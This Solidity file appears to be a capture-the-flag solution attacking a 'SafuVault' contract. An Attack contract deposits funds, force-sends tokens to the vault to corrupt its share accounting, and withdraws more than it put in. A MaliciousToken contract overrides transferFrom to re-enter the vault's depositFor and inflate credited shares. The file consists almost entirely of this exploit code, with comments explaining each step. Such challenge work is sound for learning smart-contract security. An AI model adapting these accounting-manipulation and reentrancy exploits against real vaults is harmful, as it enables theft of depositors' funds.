//SPDX-License-Identifier: MIT 
import "openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../src/Token.sol";
import "../src/SafuVault.sol";
import "openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";


interface IVault{
    function deposit(uint256 _amount) external;
    function withdraw(uint256 _shares) external;
    function balanceOf(address account) external;
}


pragma solidity ^0.8.0;

// The attack works by sending funds to the Vault without using the deposit function 
// This causes the accounting in the withdraw function to be inaccurate allowing us to withdraw more than we deposited
contract Attack { 
    // First we need to deposit some funds through the deposit function to receive the vault shares
    // Then we will force send funds to the vault using the ERC20 transfer function 
    // then we will call the withdraw function to receive more than we deposited

    function attack(address target, address token) external {
        // deposit to safu vault to receive shares 
        USDC(token).approve(target, type(uint256).max);


        uint256 balance = USDC(token).balanceOf(address(this));
        //while (balance < 12_000 * 10**18){
            uint256 for_deposit = 2 * balance / 3 ;
            uint256 for_transfer = balance - for_deposit;
            SafuVault(target).deposit(for_deposit);
            // force send funds to the vault
            USDC(token).transfer(target, for_transfer);

            // withdraw funds from the vault
            // uint256 withdraw_amount = SafuVault(target).balanceOf(address(this));
            SafuVault(target).withdraw(for_deposit);
            //balance = USDC(token).balanceOf(address(this));
       // }

    }
}

contract MaliciousToken is ERC20{
    using SafeERC20 for IERC20;

    SafuVault public safuVault;
    bool private locked;

     constructor(string memory name, string memory symbol, SafuVault _safuVault) ERC20(name, symbol) {
        safuVault = _safuVault;
        locked = false;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        if (!locked && recipient == address(safuVault)) {
            locked = true;
            safuVault.depositFor(address(this), amount, sender);
            locked = false;
        }
        else{
        safuVault.want().approve(address(safuVault), amount);
        safuVault.want().transfer(address(safuVault), amount);
        }
        
        return true;
    }
}